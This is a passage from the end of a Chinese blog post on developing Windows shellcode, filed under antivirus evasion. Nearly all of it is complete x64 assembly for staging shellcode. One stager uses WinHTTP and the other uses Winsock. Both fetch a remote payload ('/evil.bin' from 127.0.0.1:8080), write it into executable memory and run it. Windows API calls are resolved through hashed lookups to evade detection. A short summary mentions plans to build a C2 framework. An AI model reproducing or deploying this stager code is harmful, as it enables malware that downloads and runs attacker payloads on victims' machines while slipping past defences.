对齐<br>    push 0                 ; DWORD_PTR dwContext<br>    push 0                 ; DWORD dwTotalLength<br>    push 0                 ; DWORD dwOptionalLength<br>    mov r10, 094B5BFFh     ; hash( &quot;winhttp.dll&quot;, &quot;WinHttpSendRequest&quot; )<br>    call GetProcAddressByHash   ; WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);<br>    test eax,eax<br>    jz try_it_again<br><br>WinHttpReceiveResponse:<br>    mov rcx, rsi           ; HINTERNET hRequest<br>    xor rdx, rdx           ; LPVOID lpReserved (NULL)<br>    mov r10, 0E82D8B6Fh    ; hash( &quot;winhttp.dll&quot;, &quot;WinHttpReceiveResponse&quot; )<br>    call GetProcAddressByHash   ; WinHttpReceiveResponse(hRequest, NULL)<br>    test eax,eax<br>    jnz short allocate_memory<br>    jmp try_it_again<br><br>try_it_again:<br>    dec rdi<br>    jz failure<br>    jmp short WinHttpSendRequest<br><br>failure:<br>    mov r10, 2E3E5B71h    ; hash( &quot;kernel32.dll&quot;, &quot;ExitProcess&quot; )<br>    call GetProcAddressByHash   ; ExitProcess(0)<br><br>allocate_memory:<br>    xor rcx, rcx          ; LPVOID lpAddress<br>    mov rdx, 00400000h    ; SIZE_T dwSize<br>    mov r8, 1000h         ; DWORD flAllocationType(MEM_COMMIT)<br>    mov r9, 40h           ; DWORD flProtect(PAGE_EXECUTE_READWRITE)<br>    mov r10, 0BCEF49D9h    ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAlloc&quot; )<br>    call GetProcAddressByHash   ; VirtualAlloc(NULL, 0x400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE)<br><br>download_prep:<br>    xchg rax, rbx          ; 将分配的基础地址放在 ebx 中<br>    push rbx               ; 在栈上存储阶段基础地址的副本<br>    push rbx               ; 读取字节数的临时存储<br>    mov r15, rsp           ; &amp;bytesRead<br><br>query_data_available:<br>    mov rcx, rsi           ; HINTERNET hRequest<br>    mov rdx, r15           ; LPDWORD lpdwNumberOfBytesAvailable<br>    mov r10, 0C19511BAh    ; hash( &quot;winhttp.dll&quot;, &quot;WinHttpQueryDataAvailable&quot; )<br>    call GetProcAddressByHash   ; WinHttpQueryDataAvailable(hRequest, &amp;dwSize)<br>    add rsp, 20h            ; 清理保留空间<br>    test eax,eax<br>    jz failure<br>    mov eax, dword ptr [r15]<br>    test eax,eax<br>    jz download_complete<br><br>download_more:<br>    mov rcx, rsi           ; HINTERNET hRequest<br>    mov rdx, rbx           ; LPVOID lpBuffer<br>    mov r8, 2000h          ; DWORD dwNumberOfBytesToRead<br>    mov r9, r15            ; LPDWORD lpdwNumberOfBytesRead<br>    mov r10, 0F5B42CD6h     ; hash( &quot;winhttp.dll&quot;, &quot;WinHttpReadData&quot; )<br>    call GetProcAddressByHash   ; WinHttpReadData(hRequest, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead)<br>    add rsp, 20h            ; 清理保留空间<br>    test eax,eax<br>    jz failure<br>    mov ax, word ptr [r15] ; 受到的字节数<br>    add rbx, rax           ; buffer += bytes_received<br>    test rax,rax<br>    jnz query_data_available<br><br>download_complete:<br>    pop rax<br>    pop rax<br>    jmp execute_stage<br><br>execute_stage:<br>    ret<br><br>GetProcAddressByHash:<br>    push r9                     ; 保存第4个参数<br>    push r8                     ; 保存第3个参数<br>    push rdx                    ; 保存第2个参数<br>    push rcx                    ; 保存第1个参数<br>    push rsi                    ; 保存 RSI<br>    xor rdx, rdx                ; 清零 rdx<br>    mov rdx, gs:[rdx+60h]      ; 获取 PEB 的指针<br>    mov rdx, [rdx+18h]         ; 获取 PEB-&gt;Ldr<br>    mov rdx, [rdx+20h]         ; 从 InMemoryOrder 模块列表中获取第一个模块<br><br>; 获取下一个模块名称和长度<br>next_mod:                     ;<br>    mov rsi, [rdx+50h]         ; 获取模块名称的指针 (unicode 字符串)<br>    movzx rcx, word ptr [rdx+48h]  ; 将 rcx 设置为我们要检查的长度<br>    xor r9, r9                  ; 清零 r9，它将存储模块名称的哈希值<br><br>loop_modname:                 ;<br>    xor rax, rax                ; 清零 rax<br>    lodsb                       ; 读取名称的下一个字节<br>    cmp al, &#x27;a&#x27;                 ; 某些版本的 Windows 使用小写模块名称<br>    jl not_lowercase            ;<br>    sub al, 20h                ; 如果是，则标准化为大写<br>not_lowercase:                ;<br>    ror r9d, 0dh                ; 对r9 的低32位进行循环右移13位，不影响高32位<br>    add r9d, eax                ; 添加名称的下一个字节<br>    loop loop_modname           ; 循环直到我们读取足够的数据<br>    ; 现在我们已经计算了模块哈希<br>    push rdx                    ; 保存模块列表中的当前位置，供后续使用<br>    push r9                     ; 保存当前模块哈希，供后续使用<br>    ; 继续遍历导出地址表<br>    mov rdx, [rdx+20h]         ; 获取此模块的基地址<br>    mov eax, dword ptr [rdx+3ch]   ; 获取 PE 头<br>    add rax, rdx                ; 添加模块的基地址<br>    cmp word ptr [rax+18h], 020Bh ; 这个模块实际上是 PE64 可执行文件吗？<br>    ; 这个测试用例涵盖了在 wow64 上运行但在通过 nativex64.asm 的原生 x64 上下文中的情况<br>    ; 在 PEB 的模块列表中可能存在 PE32 模块（通常是主模块）<br>    ; 由于我们使用的是 win64 PEB ([gs:96])，我们不会看到 win32 PEB ([fs:48]) 中存在的 wow64 模块<br>    jne get_next_mod1           ; 如果不是，继续处理下一个模块<br>    mov eax, dword ptr [rax+88h]   ; 获取导出表的 RVA<br>    test rax, rax               ; 测试是否没有导出地址表<br>    jz get_next_mod1            ; 如果没有 EAT，处理下一个模块<br>    add rax, rdx                ; 添加模块的基地址<br>    push rax                    ; 保存当前模块的 EAT<br>    mov ecx, dword ptr [rax+18h]   ; 获取函数名称的数量<br>    mov r8d, dword ptr [rax+20h]   ; 获取函数名称的 rva<br>    add r8, rdx                 ; 添加模块的基地址<br>    ; 计算模块哈希 + 函数哈希<br>get_next_func:                ;<br>    jrcxz get_next_mod          ; 当我们到达 EAT 的开始（我们向后搜索）时，处理下一个模块<br>    dec rcx                     ; 递减函数名称计数器<br>    mov esi, dword ptr [r8+rcx*4]; 获取下一个模块名称的 rva<br>    add rsi, rdx                ; 添加模块的基地址<br>    xor r9, r9                  ; 清零 r9，它将存储函数名称的哈希值<br>    ; 并将其与我们想要的进行比较<br>loop_funcname:                ;<br>    xor rax, rax                ; 清零 rax<br>    lodsb                       ; 读取 ASCII 函数名称的下一个字节<br>    ror r9d, 0dh                ; 右旋转我们的哈希值<br>    add r9d, eax                ; 添加名称的下一个字节<br>    cmp al, ah                  ; 将 AL（名称的下一个字节）与 AH（null）进行比较<br>    jne loop_funcname           ; 如果我们没有到达 null 终止符，继续<br>    add r9, [rsp+8]             ; 将当前模块哈希添加到函数哈希<br>    cmp r9d, r10d               ; 将哈希与我们正在搜索的进行比较<br>    jnz get_next_func           ; 如果没有找到，去计算下一个函数哈希<br>    ; 如果找到，修复栈，调用函数，然后计算下一个...<br>    pop rax                     ; 恢复当前模块的 EAT<br>    mov r8d, dword ptr [rax+24h]   ; 获取序数表的 rva<br>    add r8, rdx                 ; 添加模块的基地址<br>    mov cx, [r8+2*rcx]        ; 获取所需函数的序数<br>    mov r8d, dword ptr [rax+1ch]   ; 获取函数地址表的 rva<br>    add r8, rdx                 ; 添加模块的基地址<br>    mov eax, dword ptr [r8+4*rcx] ; 获取所需函数的 RVA<br>    add rax, rdx                ; 添加模块的基地址以获取函数的实际 VA<br>    ; 我们现在修复栈并执行对所需函数的调用...<br>finish:<br>    pop r8                      ; 清除当前模块的哈希<br>    pop r8                      ; 清除模块列表中的当前位置<br>    pop rsi                     ; 恢复 RSI<br>    pop rcx                     ; 恢复第1个参数<br>    pop rdx                     ; 恢复第2个参数<br>    pop r8                      ; 恢复第3个参数<br>    pop r9                      ; 恢复第4个参数<br>    pop r10                     ; 弹出返回地址<br>    sub rsp, 20h               ; 为四个寄存器参数保留空间 (4 * sizeof(QWORD) = 0x20)<br>                                ; 如果需要，调用者有责任恢复 RSP（或分配更多空间或对齐 RSP）<br>    push r10                    ; 压回返回地址<br>    jmp rax                     ; 跳转到所需的函数<br>    ; 我们现在自动返回到正确的调用者...<br>get_next_mod:                 ;<br>    pop rax                     ; 弹出当前（现在是前一个）模块的 EAT<br>get_next_mod1:                ;<br>    pop r9                      ; 弹出当前（现在是前一个）模块的哈希<br>    pop rdx                     ; 恢复我们在模块列表中的位置<br>    mov rdx, [rdx]              ; 获取下一个模块<br>    jmp next_mod                ; 处理这个模块<br><br>main endp<br>end<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1760454150393-4f3651da-8b8c-423b-990b-2a9c9eb60fdc.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h2 id="5-6-纯汇编远程-shellcode（winsock）"><a href="#5-6-纯汇编远程-shellcode（winsock）" class="headerlink" title="5.6 纯汇编远程 shellcode（winsock）"></a>5.6 纯汇编远程 shellcode（winsock）</h2><p>额。。。。。。。这个，自己解析 http 格式，啊这，我，有点，不想写了，。。。算了还是写吧。思想大家看 one day 师傅吧，我这边直接看代码！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.code<br><br>main proc<br>    cld<br>    and rsp, 0FFFFFFFFFFFFFFF0h<br><br>load_ws2_32:<br>    mov r14, &#x27;ll&#x27;<br>    push r14<br>    mov r14, &#x27;d.23_2sw&#x27;      ; 将字节 &#x27;ws2_32.dll&#x27;,0 压入栈中<br>    push r14<br>    mov r14, rsp<br>    mov rcx, r14            ; LoadLibraryA 参数: LPCSTR lpLibFileName<br>    mov r10, 0DEC21CCDh      ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )<br>    call GetProcAddressByHash   ; LoadLibraryA(&quot;ws2_32.dll&quot;)<br><br>WSAStartup_call:<br>    mov rdi, 3              ; 初始化重试计数器 (最多重试3次)<br>    mov cx, 0202h           ; WORD wVersionRequested = MAKEWORD(2,2)<br>    push 0                  ; 为 WSADATA 预留空间 (低8字节)<br>    push 0                  ; 为 WSADATA 预留空间 (高8字节)<br>    mov rdx, rsp            ; LPWSADATA lpWSAData = rsp<br>    mov r10, 78A22668h      ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )<br>    call GetProcAddressByHash   ; WSAStartup(MAKEWORD(2,2), &amp;wsaData)<br><br>create_socket:<br>    mov ecx, 2              ; AF_INET<br>    mov edx, 1              ; SOCK_STREAM<br>    mov r8d, 6              ; IPPROTO_TCP<br>    mov r10, 65BA8FF9h      ; hash( &quot;ws2_32.dll&quot;, &quot;socket&quot; )<br>    call GetProcAddressByHash   ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)<br>    test rax, rax<br>    jz try_it_again<br>    mov rsi, rax            ; 保存 SOCKET<br><br>connect_server:<br>    sub rsp, 20h            ; 为 sockaddr_in 预留 32 字节（足够对齐）<br>    lea rdx, [rsp]          ; 指向 sockaddr_in<br>    xor rax, rax<br>    mov word ptr [rdx+0], 2     ; sin_family = AF_INET<br>    mov ax, 8080<br>    xchg al, ah<br>    mov word ptr [rdx+2], ax    ; sin_port = htons(8080)<br>    mov dword ptr [rdx+4], 0100007Fh ; 127.0.0.1<br>    mov qword ptr  [rdx+8], 0       ; 清尾部<br>    mov rcx, rsi                 ; SOCKET s<br>    mov r8d, 16                  ; sizeof(sockaddr_in)<br>    mov r10, 0D9AB4BD8h           ; hash( &quot;ws2_32.dll&quot;, &quot;connect&quot; )<br>    call GetProcAddressByHash    ; connect(s, &amp;addr, 16)<br>    test rax, rax<br>    jnz try_it_again             ; connect 成功返回 0，非零表示失败<br>    add rsp, 20h<br><br>send_http_request:<br>    mov rcx, rsi                 ; SOCKET s<br>    lea rdx, http_req            ; const char* buf<br>    mov r8d, (http_req_end - http_req) ; int len<br>    xor r9d, r9d                 ; flags = 0<br>    mov r10, 0D76F9201h          ; hash( &quot;ws2_32.dll&quot;, &quot;send&quot; )<br>    call GetProcAddressByHash    ; send(s, buf, len, 0)<br>    cmp eax, 0                   ; 检查返回值<br>    jle try_it_again             ; send 失败返回 -1，&lt;= 0 表示失败<br>    jmp allocate_buffer<br><br>try_it_again:<br>    dec rdi<br>    jz failure<br>    jmp create_socket<br><br>failure:<br>    mov r10, 2E3E5B71h    ; hash( &quot;kernel32.dll&quot;, &quot;ExitProcess&quot; )<br>    call GetProcAddressByHash   ; ExitProcess(0)<br><br>allocate_buffer:<br>    xor rcx, rcx                 ; LPVOID lpAddress = NULL<br>    mov rdx, 00400000h           ; SIZE_T dwSize = 4MB<br>    mov r8d, 1000h               ; MEM_COMMIT<br>    mov r9d, 40h                 ; PAGE_EXECUTE_READWRITE<br>    mov r10, 0BCEF49D9h          ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAlloc&quot; )<br>    call GetProcAddressByHash    ; VirtualAlloc(NULL, 0x400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE)<br>    mov r12, rax                 ; 保存缓冲区起始地址<br>    xchg rax, rbx<br><br>recv_loop:<br>    mov rcx, rsi                 ; SOCKET s<br>    mov rdx, rbx                 ; 当前写入位置<br>    mov r8d, 2000h               ; 读块大小 8192<br>    xor r9d, r9d<br>    mov r10, 0D7FF7F41h          ; hash( &quot;ws2_32.dll&quot;, &quot;recv&quot; )<br>    call GetProcAddressByHash    ; recv(s, buf, 8192, 0)<br>    cmp eax, 0                   ; 检查返回值<br>    jle recv_done                ; recv 返回 &lt;= 0 表示连接关闭(0)或失败(-1)<br>    add rbx, rax                 ; 前移写指针<br>    jmp recv_loop<br><br>recv_done:<br>    mov rcx, rsi<br>    mov r10, 0D98414B4h          ; hash( &quot;ws2_32.dll&quot;, &quot;closesocket&quot; )<br>    call GetProcAddressByHash    ; closesocket(s)<br><br>    mov r10, 06C81146Ah          ; hash( &quot;ws2_32.dll&quot;, &quot;WSACleanup&quot; )<br>    call GetProcAddressByHash    ; WSACleanup()<br><br>parse_http_response:<br>    ; 解析 HTTP 响应，找到 body 起始位置（跳过响应头）<br>    ; HTTP 响应头和 body 之间由连续的两个 CRLF（\r\n\r\n）分隔<br>    mov rdx, r12                 ; 从缓冲区起始位置开始查找<br>    mov rcx, rbx<br>    sub rcx, r12                 ; 计算接收到的总字节数<br>    test rcx, rcx<br>    jz try_it_again<br><br>find_body:<br>    mov al, byte ptr [rdx]<br>    cmp al, 0Dh                  ; 检查是否为 &#x27;\r&#x27;<br>    jne next_byte<br>    cmp byte ptr [rdx+1], 0Ah    ; 检查 &#x27;\n&#x27;<br>    jne next_byte<br>    cmp byte ptr [rdx+2], 0Dh    ; 检查 &#x27;\r&#x27;<br>    jne next_byte<br>    cmp byte ptr [rdx+3], 0Ah    ; 检查 &#x27;\n&#x27;<br>    jne next_byte<br>    ; 找到了 \r\n\r\n，body 从 rdx+4 开始<br>    lea rax, [rdx+4]             ; rax = body 起始地址<br>    push 0<br>    push rax<br>    jmp execute_stage<br><br>next_byte:<br>    inc rdx<br>    dec rcx<br>    jnz find_body<br><br>execute_stage:<br>    ret<br><br>http_req:<br>    db &#x27;GET /evil.bin HTTP/1.1&#x27;, 13, 10<br>    db &#x27;Host: 127.0.0.1:8080&#x27;, 13, 10<br>    db &#x27;Connection: close&#x27;, 13, 10<br>    db 13, 10<br>http_req_end:<br><br>GetProcAddressByHash:<br>    push r9                     ; 保存第4个参数<br>    push r8                     ; 保存第3个参数<br>    push rdx                    ; 保存第2个参数<br>    push rcx                    ; 保存第1个参数<br>    push rsi                    ; 保存 RSI<br>    xor rdx, rdx                ; 清零 rdx<br>    mov rdx, gs:[rdx+60h]      ; 获取 PEB 的指针<br>    mov rdx, [rdx+18h]         ; 获取 PEB-&gt;Ldr<br>    mov rdx, [rdx+20h]         ; 从 InMemoryOrder 模块列表中获取第一个模块<br><br>; 获取下一个模块名称和长度<br>next_mod:                     ;<br>    mov rsi, [rdx+50h]         ; 获取模块名称的指针 (unicode 字符串)<br>    movzx rcx, word ptr [rdx+48h]  ; 将 rcx 设置为我们要检查的长度<br>    xor r9, r9                  ; 清零 r9，它将存储模块名称的哈希值<br><br>loop_modname:                 ;<br>    xor rax, rax                ; 清零 rax<br>    lodsb                       ; 读取名称的下一个字节<br>    cmp al, &#x27;a&#x27;                 ; 某些版本的 Windows 使用小写模块名称<br>    jl not_lowercase            ;<br>    sub al, 20h                ; 如果是，则标准化为大写<br>not_lowercase:                ;<br>    ror r9d, 0dh                ; 对r9 的低32位进行循环右移13位，不影响高32位<br>    add r9d, eax                ; 添加名称的下一个字节<br>    loop loop_modname           ; 循环直到我们读取足够的数据<br>    ; 现在我们已经计算了模块哈希<br>    push rdx                    ; 保存模块列表中的当前位置，供后续使用<br>    push r9                     ; 保存当前模块哈希，供后续使用<br>    ; 继续遍历导出地址表<br>    mov rdx, [rdx+20h]         ; 获取此模块的基地址<br>    mov eax, dword ptr [rdx+3ch]   ; 获取 PE 头<br>    add rax, rdx                ; 添加模块的基地址<br>    cmp word ptr [rax+18h], 020Bh ; 这个模块实际上是 PE64 可执行文件吗？<br>    jne get_next_mod1           ; 如果不是，继续处理下一个模块<br>    mov eax, dword ptr [rax+88h]   ; 获取导出表的 RVA<br>    test rax, rax               ; 测试是否没有导出地址表<br>    jz get_next_mod1            ; 如果没有 EAT，处理下一个模块<br>    add rax, rdx                ; 添加模块的基地址<br>    push rax                    ; 保存当前模块的 EAT<br>    mov ecx, dword ptr [rax+18h]   ; 获取函数名称的数量<br>    mov r8d, dword ptr [rax+20h]   ; 获取函数名称的 rva<br>    add r8, rdx                 ; 添加模块的基地址<br>    ; 计算模块哈希 + 函数哈希<br>get_next_func:                ;<br>    jrcxz get_next_mod          ; 当我们到达 EAT 的开始（我们向后搜索）时，处理下一个模块<br>    dec rcx                     ; 递减函数名称计数器<br>    mov esi, dword ptr [r8+rcx*4]; 获取下一个模块名称的 rva<br>    add rsi, rdx                ; 添加模块的基地址<br>    xor r9, r9                  ; 清零 r9，它将存储函数名称的哈希值<br>    ; 并将其与我们想要的进行比较<br>loop_funcname:                ;<br>    xor rax, rax                ; 清零 rax<br>    lodsb                       ; 读取 ASCII 函数名称的下一个字节<br>    ror r9d, 0dh                ; 右旋转我们的哈希值<br>    add r9d, eax                ; 添加名称的下一个字节<br>    cmp al, ah                  ; 将 AL（名称的下一个字节）与 AH（null）进行比较<br>    jne loop_funcname           ; 如果我们没有到达 null 终止符，继续<br>    add r9, [rsp+8]             ; 将当前模块哈希添加到函数哈希<br>    cmp r9d, r10d               ; 将哈希与我们正在搜索的进行比较<br>    jnz get_next_func           ; 如果没有找到，去计算下一个函数哈希<br>    ; 如果找到，修复栈，调用函数，然后计算下一个...<br>    pop rax                     ; 恢复当前模块的 EAT<br>    mov r8d, dword ptr [rax+24h]   ; 获取序数表的 rva<br>    add r8, rdx                 ; 添加模块的基地址<br>    mov cx, [r8+2*rcx]        ; 获取所需函数的序数<br>    mov r8d, dword ptr [rax+1ch]   ; 获取函数地址表的 rva<br>    add r8, rdx                 ; 添加模块的基地址<br>    mov eax, dword ptr [r8+4*rcx] ; 获取所需函数的 RVA<br>    add rax, rdx                ; 添加模块的基地址以获取函数的实际 VA<br>finish:<br>    pop r8                      ; 清除当前模块的哈希<br>    pop r8                      ; 清除模块列表中的当前位置<br>    pop rsi                     ; 恢复 RSI<br>    pop rcx                     ; 恢复第1个参数<br>    pop rdx                     ; 恢复第2个参数<br>    pop r8                      ; 恢复第3个参数<br>    pop r9                      ; 恢复第4个参数<br>    pop r10                     ; 弹出返回地址<br>    sub rsp, 20h               ; 为四个寄存器参数保留空间 (4 * sizeof(QWORD) = 0x20)<br>                                ; 如果需要，调用者有责任恢复 RSP（或分配更多空间或对齐 RSP）<br>    push r10                    ; 压回返回地址<br>    jmp rax                     ; 跳转到所需的函数<br>    ; 我们现在自动返回到正确的调用者...<br>get_next_mod:                 ;<br>    pop rax                     ; 弹出当前（现在是前一个）模块的 EAT<br>get_next_mod1:                ;<br>    pop r9                      ; 弹出当前（现在是前一个）模块的哈希<br>    pop rdx                     ; 恢复我们在模块列表中的位置<br>    mov rdx, [rdx]              ; 获取下一个模块<br>    jmp next_mod                ; 处理这个模块<br><br>main endp<br>end<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1760512009796-ed17cf5e-c314-4737-8a50-d7b2899ada07.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>okok，非常的完美，目前基础的三种 shellcode 编写都已经成功实现了，也是基本具有了写 shellcode 的能力，后面再进一步 C2 的开发计划了。</p>
<p>感觉不算非常困难，真的一步一步调过和写过这些汇编就会发现，其实并没有那么困难，和写高级编程语言的代码类似，但是需要注意寄存器污染和 rsp 对齐的问题，其他就没有了。好了就这样。。。。。。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17644">https://xz.aliyun.com/news/17644</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17827">https://xz.aliyun.com/news/17827</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17961">https://xz.aliyun.com/news/17961</a></li>
</ol>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" class="category-chain-item">免杀对抗</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/shellcode/" class="print-no-link">#shellcode</a>
      
        <a href="/tags/Windows%E7%BC%96%E7%A8%8B/" class="print-no-link">#Windows编程</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Windows系统shellcode开发</div>
      <div>http://candyb0x.github.io/2025/10/15/Windows系统shellcode开发/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Candy</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年10月15日</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>更新于</div>
          <div>2025年12月24日</div>
        </div>
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/10/29/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9Bweb%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86wp/" title="2025强网拟态初赛web方向部分wp">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">2025强网拟态初赛web方向部分wp</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/10/12/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E6%89%8B%E6%90%93C2-%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84/" title="从0开始手搓C2 - 基础架构">
                        <span class="hidden-mobile">从0开始手搓C2 - 基础架构</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
